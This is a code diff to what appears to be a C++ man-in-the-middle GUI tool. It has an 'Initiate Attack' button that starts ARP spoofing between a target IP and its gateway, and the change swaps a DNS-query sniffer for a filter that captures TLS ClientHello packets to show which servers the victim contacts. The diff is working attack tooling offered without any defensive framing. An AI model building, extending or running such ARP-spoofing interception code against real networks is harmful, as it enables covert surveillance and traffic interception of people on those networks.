@@ -282,6 +282,7 @@ void ClientApplication::render_mitm_attack_data()
 		{
 			if (ImGui::Button("Initiate Attack", ImVec2(110, 25)))
 			{
+				m_mitm_data.attack_in_progress = true;
 				start_arp_spoofing_loop();
 				start_traffic_interception_loop();
 			}
@@ -409,15 +410,11 @@ void ClientApplication::render_intercepted_traffic_window()
 			if (!packet_ref)
 				continue;
 
-			DnsLayer* dns_layer = reinterpret_cast<DnsLayer*>(packet_ref->buffer);
+			TlsHandshakePacket* tls_packet = reinterpret_cast<TlsHandshakePacket*>(packet_ref->buffer);
 
-			ImGui::Text("DNS Query: ", header.len);
-
-			if (htons(dns_layer->qdcount) == 1)
-			{
-				ImGui::SameLine();
-				ImGui::Text(extract_dns_query_qname(dns_layer).c_str());
-			}
+			ImGui::Text("TLS Connection: ");
+			ImGui::SameLine();
+			ImGui::Text(extract_tls_connection_server_name(tls_packet).c_str());
 		}
 	}
 
@@ -444,8 +441,6 @@ void ClientApplication::start_arp_spoofing_loop()
 			m_mitm_data.target_ip.c_str(),
 			m_mitm_data.gateway_ip.c_str()
 		);
-
-		m_mitm_data.attack_in_progress = true;
 
 		while (m_mitm_data.attack_in_progress &&
 			   !m_mitm_data.rearping_in_progress)
@@ -518,16 +513,27 @@ void ClientApplication::start_traffic_interception_loop()
 			if (!target_is_sender)
 				continue;
 
-			// Testing DNS filter
+			// Testing TLS filter
 			if (eth_layer->protocol != htons(PROTOCOL_IPV4))
 				continue;
 
 			IpLayer* ip_layer = reinterpret_cast<IpLayer*>(packet->buffer);
-			if (ip_layer->protocol != PROTOCOL_UDP)
+			if (ip_layer->protocol != PROTOCOL_TCP)
 				continue;
 
-			UdpLayer* udp_layer = reinterpret_cast<UdpLayer*>(packet->buffer);
-			if (udp_layer->dest_port != htons(PORT_DNS))
+			TcpLayer* tcp_layer = reinterpret_cast<TcpLayer*>(packet->buffer);
+			if (tcp_layer->dest_port != htons(PORT_TLS))
+				continue;
+
+			if (tcp_layer->flags != TCP_FLAGS_PSH_ACK)
+				continue;
+
+			TlsHeader* tls_header = reinterpret_cast<TlsHeader*>(packet->buffer);
+			if (tls_header->content_type != TLS_CONTENT_TYPE_HANDSHAKE)
+				continue;
+
+			TlsHandshakePacket* tls_handshake = reinterpret_cast<TlsHandshakePacket*>(packet->buffer);
+			if (tls_handshake->type != TLS_HANDSHAKE_TYPE_HELLO_CLIENT)
 				continue;
 
 			// Lock the mutex
